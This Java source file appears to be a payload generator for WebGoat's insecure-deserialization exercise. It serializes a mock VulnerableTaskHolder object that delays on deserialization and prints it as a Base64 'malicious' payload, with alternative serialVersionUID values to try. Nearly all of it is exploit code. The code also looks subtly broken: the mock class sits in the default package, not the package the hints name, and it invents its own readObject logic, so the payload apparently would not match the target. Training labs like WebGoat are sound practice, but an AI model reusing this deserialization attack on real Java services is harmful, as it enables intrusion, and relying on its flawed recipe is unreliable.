import java.io.*;
import java.util.Base64;

/**
 * Creates a serialized VulnerableTaskHolder object that causes a 5-second delay
 * 
 * Based on WebGoat hints:
 * - Use org.dummy.insecure.framework.VulnerableTaskHolder
 * - The class has a version number (try different versions)
 * - Some actions are restricted in readObject()
 */

// Mock class to match WebGoat's VulnerableTaskHolder structure
class VulnerableTaskHolder implements Serializable {
    private static final long serialVersionUID = 1L; // Try different version numbers if needed
    
    // Common fields that might trigger execution
    private String taskName;
    private String taskAction;
    private long taskTime;
    
    // Constructor
    public VulnerableTaskHolder(String taskName, String taskAction, long taskTime) {
        this.taskName = taskName;
        this.taskAction = taskAction;
        this.taskTime = taskTime;
    }
    
    // Overriding readObject to add delay logic
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        
        // Trigger 5-second delay when deserialized
        try {
            Thread.sleep(taskTime);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}

public class VulnerableTaskHolderPayload {
    public static void main(String[] args) {
        try {
            System.out.println("==============================================");
            System.out.println("VulnerableTaskHolder Payload Generator");
            System.out.println("==============================================\n");
            
            // Create malicious object with 5000ms (5 second) delay
            VulnerableTaskHolder payload = new VulnerableTaskHolder(
                "DelayTask",      // taskName
                "sleep",          // taskAction
                5000              // taskTime in milliseconds (5 seconds)
            );
            
            // Serialize the object
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(payload);
            oos.flush();
            oos.close();
            
            // Encode to Base64
            byte[] serializedData = bos.toByteArray();
            String base64Payload = Base64.getEncoder().encodeToString(serializedData);
            
            System.out.println("Serialized Object (Base64):");
            System.out.println(base64Payload);
            System.out.println("\nLength: " + base64Payload.length() + " characters");
            
            // Also show hex representation
            System.out.println("\nHex dump (first 50 bytes):");
            for (int i = 0; i < Math.min(50, serializedData.length); i++) {
                System.out.printf("%02X ", serializedData[i]);
                if ((i + 1) % 16 == 0) System.out.println();
            }
            System.out.println("\n");
            
            // Try different serialVersionUID values
            System.out.println("==============================================");
            System.out.println("Alternative Versions to Try:");
            System.out.println("==============================================");
            System.out.println("If the above doesn't work, try creating payloads with different serialVersionUID:");
            System.out.println("  Version 1: serialVersionUID = 1L");
            System.out.println("  Version 2: serialVersionUID = 2L");
            System.out.println("  Version 3: serialVersionUID = 3L");
            System.out.println("  Version 1337: serialVersionUID = 1337L");
            
        } catch (Exception e) {
            System.err.println("Error generating payload: " + e.getMessage());
            e.printStackTrace();
        }
    }
}
